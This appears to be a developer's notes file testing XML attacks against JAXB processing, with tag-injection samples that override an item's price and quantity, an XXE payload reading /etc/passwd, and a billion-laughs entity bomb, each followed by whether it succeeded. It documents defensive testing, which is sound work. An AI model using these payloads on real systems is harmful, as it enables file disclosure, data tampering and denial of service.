XML Attacks for JAXB Processing
-------------------------------------------------------------------------------

Tag Injection
-------------------------------------------------------------------------------

Example: Injecting new attributes and elements

	<SessionRoot>
	    <Sessions>
	        <Session id="one" valid="true" hack="true"/>
	        <Session id="two" valid="false" />
	    </Sessions>    
	    <Hack>
	    	<blackhack id="666" />
	    </Hack>
	</SessionRoot>


Example: Overriding existing elements

	<Item>
		<description>Widget</description>
		<price>500.0</price>
		<quantity>1</quantity>
		
		<!-- Additional Rows below for price and quantity -->
		<price>1.0</price>
		<quantity>1000</quantity>
	</Item>

=> Works without XML Schema validation!!
   (See ItemTest)
   

XXL EXternal Entity Attack (XXE)
-------------------------------------------------------------------------------

Example:

	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
	<Person>
		<FirstName>Sanjay</FirstName>
		<LastName>Acharya&xxe;</LastName>
	</Person>
	
=> Doesn't work with JAXB


XML Bomb
-------------------------------------------------------------------------------

Example:
	<!DOCTYPE lolz [
	  <!ENTITY lol "lol">
	  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
	  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
	  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
	  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
	  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
	  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
	  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
	  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
	]>
	<lolz>&lol9;</lolz>	   	
	
=> Doesn't work in a JDK > 1.4
	"The parser has encountered more than "64,000" entity expansions in this document..."
	

Resources:
-------------------------------------------------------------------------------
http://sleeplessinslc.blogspot.co.at/2010/09/xml-injection.html		
https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)
https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing
